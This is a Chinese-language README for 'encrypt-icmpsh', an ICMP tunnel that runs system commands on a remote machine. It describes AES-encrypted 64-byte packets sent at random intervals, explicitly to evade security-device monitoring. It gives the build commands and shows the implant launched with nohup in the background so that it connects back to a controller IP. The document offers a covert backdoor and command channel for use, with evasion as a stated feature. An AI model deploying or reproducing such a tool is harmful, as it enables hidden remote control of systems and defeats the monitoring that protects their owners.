# encrypt-icmpsh
一个ICMP加密通信隧道，用来执行系统命令，采用aes加密，每个icmp包为64字节长度以随机时间发送，躲过安全设备监测。
（aes加密算法采用的是csdn大佬R-QWERT代码）


使用方法：
控制机：
gcc -g icmpsendcmd.c icmpsend.c aes.c -o icmpsend

./icmpsend  被控制机ip


被控机：
gcc -g testicmpback.c aes.c icmpback.c -o icmpback

nohup ./icmpback 控制机ip & (进入后台运行)


效果：
控制端：
![image](https://user-images.githubusercontent.com/53997549/174488396-94e305bd-4abf-4e68-a3c0-7b2a98dcee74.png)

抓包效果：

![image](https://user-images.githubusercontent.com/53997549/174488497-0e5c46d2-ba00-43fd-893a-15f809070d6f.png)
